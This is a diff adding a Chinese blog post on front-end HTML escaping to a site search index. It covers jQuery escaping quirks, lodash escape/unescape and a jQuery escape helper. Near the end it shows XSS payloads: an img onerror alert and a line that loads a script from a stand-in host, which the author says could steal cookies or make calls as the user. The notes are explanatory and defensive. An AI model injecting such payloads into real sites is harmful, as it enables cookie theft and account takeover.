@@ -4,6 +4,57 @@
   
     
     <entry>
+      <title><![CDATA[Question]]></title>
+      <url>https://fuzhongfeng.github.io/2019/08/20/questions-1/</url>
+      <content type="html"><![CDATA[<h1 id="开发常见问题"><a href="#开发常见问题" class="headerlink" title="开发常见问题"></a>开发常见问题</h1><hr>
+<h2 id="1-html转义问题"><a href="#1-html转义问题" class="headerlink" title="1. html转义问题"></a>1. html转义问题</h2><h3 id="dom-上的属性被-转义："><a href="#dom-上的属性被-转义：" class="headerlink" title="dom 上的属性被$()转义："></a>dom 上的属性被$()转义：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$(&apos;&lt;div data-comment=&quot;&#123;&amp;quot;title&amp;quot;:&amp;quot;重难点&amp;quot;,&amp;quot;background&amp;quot;:&amp;quot;rgb(240, 149, 82)&amp;quot;,&amp;quot;icon_src&amp;quot;:&amp;quot;/system/images/171025215642____.png&amp;quot;,&amp;quot;content&amp;quot;:&amp;quot;11111&lt;br /&gt;22222&lt;br /&gt;33333&lt;br /&gt;44444&lt;br /&gt;&amp;quot;&#125;&quot;&gt;&lt;/div&gt;&apos;)</span><br><span class="line"></span><br><span class="line">// 将div标签上的 data-comment 属性转义后的值如下：</span><br><span class="line">nodeValue: &quot;&#123;&quot;title&quot;:&quot;重难点&quot;,&quot;background&quot;:&quot;rgb(240, 149, 82)&quot;,&quot;icon_src&quot;:&quot;/system/images/171025215642____.png&quot;,&quot;content&quot;:&quot;11111&lt;br &gt;&lt;/div&gt;22222&lt;br /&gt;33333&lt;br /&gt;44444&lt;br /&gt;&quot;&#125;&quot; </span><br><span class="line">// 明显多出来一个&lt;/div&gt;啊</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>解决办法</p>
+<ol>
+<li>lodash 的 escape 和 unescape(推荐)</li>
+</ol>
+<ul>
+<li>_.escape：转换字符串中的 <code>&quot;&amp;&quot;, &quot;&lt;&quot;, &quot;&gt;&quot;, &#39;&quot;&#39;, &quot;&#39;&quot;</code> 为HTML的响应实体字符，没有其他多余的字符被转义。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_.escape(&apos;11111&lt;br /&gt;22222&lt;br /&gt;33333&lt;br /&gt;44444&lt;br /&gt;&apos;)</span><br><span class="line">// &quot;11111&amp;lt;br /&amp;gt;22222&amp;lt;br /&amp;gt;33333&amp;lt;br /&amp;gt;44444&amp;lt;br /&amp;gt;&quot;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</blockquote>
+<ul>
+<li><p>_.usescape：转换字符串中的实体字符 <code>&amp;amp;, &amp;lt;, &amp;gt;, &amp;quot;, &amp;#39;</code> 为响应的 HTML 字符。与escape中的字符一一对应。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_.unescape(&apos;11111&amp;lt;br /&amp;gt;22222&amp;lt;br /&amp;gt;33333&amp;lt;br /&amp;gt;44444&amp;lt;br /&amp;gt;&apos;)</span><br><span class="line">// &quot;11111&lt;br /&gt;22222&lt;br /&gt;33333&lt;br /&gt;44444&lt;br /&gt;&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>如果不反转义直接放到dom中呢？</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 浏览器会反转义一次字符串，结果展示到页面上：</span><br><span class="line">11111&lt;br /&gt;22222&lt;br /&gt;33333&lt;br /&gt;44444&lt;br /&gt; // 纯字符串</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>当在浏览器控制台选中dom后，右键选择：”Edit as HTML”后，展示的输入框内容相当于进行了一次 escape，确定输入后又进行了一次 unescape, HTML 中的预留字符必须被替换为字符实体。</p>
+</li>
+</ul>
+<ol start="2">
+<li>利用 jquery<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// HTML标签转义（&lt; 转为 &amp;lt;）</span><br><span class="line">function html2Escape(sHtml) &#123;</span><br><span class="line">  return $(&quot;&lt;div/&gt;&quot;).text(sHtml).html();</span><br><span class="line">&#125;</span><br><span class="line">// HTML标签反转义（&amp;lt; 转为 &lt;）</span><br><span class="line">function escape2Html(str) &#123;</span><br><span class="line">  return $(&quot;&lt;div/&gt;&quot;).html(str).text();</span><br><span class="line">&#125;</span><br><span class="line">// 此方法在反转义的时候会将形如：1&lt;br &gt;&lt;/div&gt;2&lt;br /&gt;3&lt;br /&gt;的内容反转为123</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="除了被-转义外，其他情况有哪些呢？"><a href="#除了被-转义外，其他情况有哪些呢？" class="headerlink" title="除了被 $() 转义外，其他情况有哪些呢？"></a>除了被 $() 转义外，其他情况有哪些呢？</h3><ol>
+<li>XSS 攻击<br>在浏览器上随便选择一个 dom，控制台执行如下代码：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$0.innerHTML=&quot;&lt;img src=@ onerror=alert(1)&gt;&quot; // alert(1)</span><br><span class="line"></span><br><span class="line">$0.innerHTML = &quot;&lt;img src=@ onerror=&apos;var s=document.createElement(\&quot;script\&quot;);s.src=\&quot;https://xxx.com/xx.js\&quot;;document.body.appendChild(s);&apos; /&gt;&quot;</span><br><span class="line">// 代码中引入了一个第三方的脚本，这样做的事情就多了，从取你的 cookie，发送到黑客自己的服务器，到监听你的输入，到发起 CSRF 攻击，直接以你的身份调用网站的各种接口等</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<hr>
+<h3 id="XSS-攻击-待续。。。"><a href="#XSS-攻击-待续。。。" class="headerlink" title="XSS 攻击(待续。。。)"></a>XSS 攻击(待续。。。)</h3>]]></content>
+      
+        <categories>
+            
+            <category> Question </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> Question </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[Performance]]></title>
       <url>https://fuzhongfeng.github.io/2019/08/14/performance/</url>
       <content type="html"><![CDATA[<h1 id="性能"><a href="#性能" class="headerlink" title="性能"></a>性能</h1><hr>
